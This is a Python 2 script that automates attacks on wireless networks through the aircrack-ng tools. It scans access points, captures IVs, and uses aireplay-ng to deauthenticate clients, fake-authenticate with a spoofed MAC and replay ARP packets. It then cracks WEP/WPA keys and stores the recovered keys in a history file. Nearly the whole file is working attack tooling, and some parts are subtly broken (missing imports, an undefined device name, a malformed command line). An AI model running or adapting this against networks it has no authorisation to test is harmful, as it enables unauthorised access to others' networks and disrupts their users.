#!/usr/bin/python

import os, signal, sys
import commands
import subprocess
import random
import threading
import socket
from ConfigParser import ConfigParser
import time

#LOG_PATH = "/media/card/caps"
#WIRELESS_DEVICE = "wlan0"
#MONITOR_DEVICE = "mon0"
MONITOR_MODE_CMD = "airmon-ng start wlan0"

def get_ip_address(ifname):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    return socket.inet_ntoa(fcntl.ioctl(
        s.fileno(),
        0x8915,  # SIOCGIFADDR
        struct.pack('256s', ifname[:15])
        )[20:24])
        
def get_hw_address(ifname):
    import fcntl, struct
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    info = fcntl.ioctl(s.fileno(), 0x8927,  struct.pack('256s', ifname[:15]))
    hwaddr = []
    for char in info[18:24]:
        hdigit = hex(ord(char))[2:]
        if len(hdigit) == 1:
            hdigit = "0%s" % hdigit
        hwaddr.append(hdigit)
    return hwaddr


def getCellInfo():
    rawcells = commands.getoutput("iwlist %s scanning" % WIRELESS_DEVICE).split("Cell")
    cells = {}
    for celld in rawcells:
        cell = {}
        cell_data = celld.split('\n')
        for field in cell_data:
            field = field.strip()
            vals = field.split(':')
            #print vals
            if "Address" in vals[0]:
                if len(vals) < 7:
                    print vals
                else:
                    cell["address"] = "%s:%s:%s:%s:%s:%s" % (vals[1], vals[2], vals[3], vals[4], vals[5], vals[6])                
            elif "Channel" in vals[0]:
                cell["channel"] = vals[1]
            elif "ESSID" in vals[0]:
                    cell["essid"] = vals[1].replace('"', '').upper()
            elif "Quality" in vals[0]:
                cell["quality"] = vals[0].split('=')[1]
        if cell.has_key("essid"):
            cells[cell["essid"]] = cell
    return cells

def getCellByAddress(bssid, cells=None):
    if cells is None:
        cells = getCellInfo()
    for cell in cells.values():
        if cell["address"].lower() == bssid.lower():
            return cell
    return None

def isMonitorMode(monitor_device):
    out = commands.getoutput("iwconfig %s" % monitor_device.name).lower()
    if "mode:monitor" in out:
        return True
    return False

def setMonitorMode(wireless_device, monitor_device):
    if isMonitorMode(monitor_device):
        return True    
    print "setting device mode to 'Monitor'..."    
    commands.getoutput(MONITOR_MODE_CMD)
    if isMonitorMode(monitor_device):
        print "devine now in monitor mode"
        return True
    print "failed to get device into monitor mode"
    return False

FAKE_AUTH_CMD = "aireplay-ng -1 0 -a %s -h 00:26:F2:B7:71:C2 mon0"
CRACK_CMD = "aircrack-ng /caps/%s.*.cap"

class NetworkInterface(object):
    """docstring for NetworkInterface"""
    def __init__(self, name):
        self.name = name
        self.ip = None
        self.mac = None
        
    def getMac(self):
        if self.mac is None:
            self.mac = ":".join(get_hw_address(self.name))
        return self.mac
    
    def getDynamicIP(self, ip):
        pass
    
    def setIP(self, ip):
        pass
    
    def changeMac(self, mac):
        # take interface down
        # change interface mac
        # bring interface back up
        pass
    
    def setKey(self, key):
        pass
    
    def setEssid(self, essid):
        out = commands.getoutput("iwconfig %s essid %s" % (self.name, essid))
        if len(out) < 2:
            return True
        return False
    
    def setChannel(self, channel):
        out = commands.getoutput("iwconfig %s channel %s" % (self.name, channel))
        if len(out) < 2:
            return True
        return False

class AccessPoint(object):
    """represents a wireless network"""
    def __init__(self, mac, log_path):
        self.mac = mac
        self.vulnerability = 0
        self.cracked = False
        self.crack_attempts = 0
        self.first_seen = None
        self.last_seen = None
        self.age = 5000
        self.channel = 0
        self.speed = 0
        self.privacy = "n/a"
        self.cipher = None
        self.auth = None
        self.power = 0
        self.beacons = 0
        self.ivs = 0
        self.lan = 0
        self.ip = 0
        self.id_length = 0
        self.essid = "n/a"
        self.key = None
        self.stations = {}
    
    def update(self, fields):
        # BSSID, First time seen, Last time seen, channel, Speed, Privacy, Cipher, Authentication, Power, # beacons, # IV, LAN IP, ID-length, ESSID, Key
        if self.first_seen is None:
            self.first_seen = time.mktime(time.strptime(fields[1].strip(), "%Y-%m-%d %H:%M:%S"))
        try:
            self.last_seen = time.mktime(time.strptime(fields[2].strip(), "%Y-%m-%d %H:%M:%S"))
        except:
            self.last_seen = 0
        self.age = time.time() - self.last_seen
        self.channel = int(fields[3].strip())
        self.speed = int(fields[4].strip())
        self.privacy = fields[5].strip()
        self.cipher = fields[6].strip()
        self.auth = fields[7].strip()
        self.power = int(fields[8].strip())
        self.beacons = int(fields[9].strip())
        self.ivs = int(fields[10].strip())
        self.ip = fields[11].strip()
        self.id_length = fields[12].strip()
        self.essid = fields[13].strip()
        if len(self.essid) == 0:
            self.essid = "unknown"
        #if self.key is None or len(self.key) < 2:
        #    self.key = fields[14].strip()
    
    def asJSON(self):
        d = {}
        for k, i in self.__dict__.items():
            if type(i) in [str, int, float]:
                d[k] = i
        d["stations"] = {}
        for s in self.stations.values():
            d["stations"][s.mac] = s.asJSON()
        return d
    
    
    def __str__(self):
        return "ap('%s'): channel: '%s' privacy: '%s' cipher: '%s'  auth: %s  power: '%s'  " % (self.essid, 
            self.channel, self.privacy, self.cipher, self.auth, self.power)
        
class Station(object):
    """docstring for Station"""
    def __init__(self, mac):
        self.mac = mac
        self.first_seen = None
        self.last_seen = None
        self.power = 0
        self.packets = 0
        self.ap_mac = None
    
    def update(self, fields):
        self.first_seen = fields[1]
        self.last_seen = fields[2]
        self.power = fields[3]
        self.packets = fields[4]
        self.ap_mac = fields[5]
    
    def asJSON(self):
        d = {}
        for k, i in self.__dict__.items():
            if type(i) in [str, int, float]:
                d[k] = i
        return d

        

class AttackProperties(object):
    """info about the current attack"""
    def __init__(self, monitor_device, inject_device, log_path):
        self.monitor_device = monitor_device
        self.inject_device = inject_device
        self.log_path = log_path
        self.log_prefix = log_path
        self.aps = {}
        self.historic_aps = {}
        self.target = None
        self.history_file = os.path.join(log_path, "crack-history.ini")
        self.loadHistory()
    
    def hasAP(self, ap_mac):
        return self.aps.has_key(ap_mac) or self.historic_aps.has_key(ap_mac)
        
    def getAP(self, ap_mac):
        if self.aps.has_key(ap_mac):
            return self.aps[ap_mac]
        elif self.historic_aps.has_key(ap_mac):
            return self.historic_aps[ap_mac]
        return None
    
    def getActiveAP(self, ap_mac):
        if self.aps.has_key(ap_mac):
            return self.aps[ap_mac]
        
        if self.historic_aps.has_key(ap_mac):
            ap = self.historic_aps[ap_mac]
            self.aps[ap_mac] = ap
            return ap
        return None
    
    def addActiveAP(self, ap):
        if not self.aps.has_key(ap.mac):
            self.aps[ap.mac] = ap
    
    def clearActive(self):
        self.aps.clear()
    
    def loadHistory(self):
        if os.path.exists(self.history_file):
            config = ConfigParser()
            config.read(self.history_file)
            for section in config.sections():
                ap_mac = section
                if ap_mac != None:
                    self.historic_aps[ap_mac] = AccessPoint(ap_mac, self.log_path)
                    self.historic_aps[ap_mac].first_seen = config.get(section, "first_seen", None)
                    self.historic_aps[ap_mac].last_seen = config.get(section, "last_seen", None)
                    self.historic_aps[ap_mac].essid = config.get(section, "essid", None)
                    if config.has_option(section, "key"):
                        self.historic_aps[ap_mac].key = config.get(section, "key", None)
    
    def saveHistory(self):
        config = ConfigParser()
        config.read(self.history_file)
        for ap_mac in self.aps:
            if not config.has_section(ap_mac):
                config.add_section(ap_mac)
            ap = self.aps[ap_mac]
            config.set(ap_mac, "first_seen", ap.first_seen)
            config.set(ap_mac, "last_seen", ap.last_seen)
            config.set(ap_mac, "essid", ap.essid)
            if ap.key != None:
                config.set(ap_mac, "key", ap.key)
        
        with open(self.history_file, 'w') as configfile:
            config.write(configfile)
    
    def setTarget(self, target):
        self.target = target
        if self.target != None:
            self.log_prefix = os.path.join(self.log_path, target.essid.replace(' ', '_'))
        else:
            self.log_prefix = self.log_path


def parseMonitorLog(log_file, attack_props):
    """update our info from the log files"""
    if not os.path.exists(log_file):
        return
    report = open(log_file, 'r')
    lines = report.readlines()
    #print lines
    report.close()
    
    readingStations = False
    readingAps = False
    for line in lines:
        line = line.strip()
        #print line
        if not readingStations and not readingAps:
            if line.startswith("BSSID"):
                readingAps = True
                continue
            elif line.startswith("Station"):
                readingStations = True
                continue
        elif readingAps:
            if len(line) < 4:
                readingAps =False
            else:
                fields = line.split(',')
                #print fields
                ap_mac = fields[0].strip()
                if attack_props.hasAP(ap_mac):
                    ap = attack_props.getActiveAP(ap_mac)
                else:
                    ap = AccessPoint(ap_mac, attack_props.log_path)
                    attack_props.addActiveAP(ap)
                ap.update(fields)
        elif readingStations and len(line) > 4:
            fields = line.split(',')
            station_mac = fields[0].strip()
            ap_mac = fields[5].strip()
            if attack_props.hasAP(ap_mac):
                ap = attack_props.getAP(ap_mac)                    
                if ap.stations.has_key(station_mac):
                    station = ap.stations[station_mac]
                else:
                    station = Station(station_mac)
                    ap.stations[station_mac] = station
                    station.ap = station
                station.update(fields)    

class AirMonitor(object):
    """Monitors channels 1-12 for wireless networks"""    
    EXPLORE_COMMAND = "airodump-ng -o csv --ivs --write %s %s"
    
    def __init__(self, attack_props, auto_start=False):
        self.attack_props = attack_props
        self.file_prefix = os.path.join(attack_props.log_path, "monitor")
        self.monitor_log = self.file_prefix + "-01.csv"
        self.process = None
        self.aps = attack_props.aps
        if auto_start:
            self.start()

    def isRunning(self):
        try:
            res = self.process != None and self.process.poll() is None
            return res
        except:
            pass
        return False
        
    def start(self):
        if self.process is None:
            commands.getoutput("rm %s*" % self.file_prefix)
            cmd = AirMonitor.EXPLORE_COMMAND % (self.file_prefix, self.attack_props.monitor_device.name)
            self.FNULL = open('/dev/null', 'w')
            self.process = subprocess.Popen(cmd, shell=True, stdout=self.FNULL, stderr=self.FNULL)
        else:
            raise Exception("AirMonitor already running")
            
    def stop(self):
        if self.process != None:
            try:
                self.process.kill()
                commands.getoutput("kill -9 %s" % self.process.pid)
                commands.getoutput("killall airodump-ng")
            except:
                pass
            self.process = None
            self.FNULL.close()
    
    def update(self):
        """
        self.attack_props.log_path + "-01.txt"
        """
        parseMonitorLog(self.monitor_log, self.attack_props)
        

class AirCapture(AirMonitor):
    """Captures IVs into cap files for cracking WEPs"""
    CAPTURE_COMMAND = "airodump-ng --channel %s --bssid %s --write %s %s"
    
    def __init__(self, attack_props):
        AirMonitor.__init__(self, attack_props, False)
        self.file_prefix = attack_props.log_prefix
        self.monitor_log = self.file_prefix + "-01.csv"
        self.start()
        
    def start(self):
        commands.getoutput("rm %s*" % self.file_prefix)
        cmd = AirCapture.CAPTURE_COMMAND % (self.attack_props.target.channel, self.attack_props.target.mac, 
                                            self.file_prefix, self.attack_props.monitor_device.name)
        self.FNULL = open('/dev/null', 'w')
        self.process = subprocess.Popen(cmd, shell=True, stdout=self.FNULL, stderr=self.FNULL)
        
            
class AirPlay(object):
    """Ability to inject packets into the wireless network we are attacking"""
    ARP_INJECTION_CMD = "aireplay-ng -3 -b %s -h %s %s > %s-arp_inject.log"
    DEAUTHENTICATE_CMD = "aireplay-ng --deauth %d -a %s -h %s"
    FAKE_AUTHENTICATE_CMD = """aireplay-ng --fakeauth %d -e "%s" -a %s -h %s"""
    
    def __init__(self, attack_props):
        self.attack_props = attack_props
        self.process = None
        self.attack_props.monitor_device.setChannel(self.attack_props.target.channel)
        
    def deauthenticate(self, count=1, target_mac=None):
        """Attempts to deauthenticate all stations or a target station"""
        cmd = AirPlay.DEAUTHENTICATE_CMD % (count, self.attack_props.target.mac, self.attack_props.monitor_device.getMac())
        if target_mac != None:
            cmd += " -c %s" % target_mac
        cmd += " %s" % self.attack_props.inject_device.name
        lines = commands.getoutput(cmd).split('\n')
        for line in lines:
            if len(line) > 2:
                if not "Waiting for beacon frame" in line: # spam
                    if not "No source MAC" in line: # spam
                        if not "Sending" in line: # spam
                            print "deauthentication erros: "
                            print "\n".join(lines)
                            return False
        return True
        
    def fakeAuthenticate(self, auth_delay=0, keep_alive_seconds=None, prga_file=None):
        """Fake authentication with AP"""
        # setup the wireless card to be on the correct channel
        # print "\tsetting channel: %d" % self.attack_props.target.channel
        if not self.attack_props.monitor_device.setChannel(self.attack_props.target.channel):
            print "failed to set correct channel for authentication"
            return False
        
        cmd = AirPlay.FAKE_AUTHENTICATE_CMD % (auth_delay, self.attack_props.target.essid, 
                                self.attack_props.target.mac, self.attack_props.monitor_device.getMac())
        # print cmd
        if keep_alive_seconds != None: 
            cmd += " -q %i" % keep_alive_seconds
        
        if prga_file != None:
             cmd += " -y %s" % prga_file
        
        cmd += " %s" %  self.attack_props.monitor_device.name
        lines = commands.getoutput(cmd).split('\n')
        
        success = False
        for line in lines:
            if "Association successful" in line:
                success = True
            if "Authentication successful" in line:
                success = True
            elif "AP rejects open-system authentication" in line:
                success = False
            elif "Denied (Code 1) is WPA in use?" in line:
                success = False
            elif "doesn't match the specified MAC" in line:
                success = False
            elif "Attack was unsuccessful" in line:
                success = False
                
        # if not success:
        #     print lines
        return success

    def startArpInjection(self):
        cmd = AirPlay.ARP_INJECTION_CMD % (self.attack_props.target.mac, self.attack_props.inject_device.getMac(), 
                                            self.attack_props.monitor_device.name, self.attack_props.log_prefix)
        self.process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
    def isRunning(self):
        return self.process != None and self.process.poll() is None        
        
    def stop(self):
        if self.process != None:
            self.process.kill()
            commands.getoutput("killall aireplay-ng")
        self.process = None
        
class AirCracker(object):
    """runs a process that attempts to crack the network reading the captured packets"""
    def __init__(self, attack_props, auto_start=True):
        self.attack_props = attack_props
        self.process = None
        self.start()
        
    def isRunning(self):
        return self.process != None and self.process.poll() is None
        
    def start(self, key_file=None, dictionary=None):
        """
        This command starts a cracker and returns the key if it's able
        to find it. Optional KeyFile can be used to specify a keyfile
        otherwise all keyfiles will be used. If dictionary is specified
        it will try to crack key using it (WPA2). aircrack-ng will run
        quitely until key is found (WEP/WPA) or cross-reference with
        dictionary fails.

        Dictionary can be a string of several dicts seperated by ","
        Like: "dict1.txt,dictpro2.txt,others.txt"
        """

        cmd = "aircrack-ng -q -b %s" % self.attack_props.target.mac # -q for quite to only output the key if found

        if dictionary != None: # Use dictionary if one is specified
            cmd += " -w %s" % dictionary

        if key_file is None: # If keyfile is specified us it, else use standard path
            cmd += " %s*.cap" % self.attack_props.log_prefix
        else:
            cmd += " ", Keyfile

        self.process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def stop(self):
        if self.process != None:
            self.process.kill()
            commands.getoutput("killall aircrack-ng")
            self.process = None

    def checkResults(self):
        if self.process is None:
            return False
            
        output = self.process.communicate()[0]
        for line in output.split("\n"):
            if not line == "":
                if "KEY FOUND" in line: # Key found, lets call event KeyFound
                    words = line.split(" ")
                    #print words
                    self.attack_props.target.key = words[3]
                    self.attack_props.saveHistory()
                    return True
        return False
        
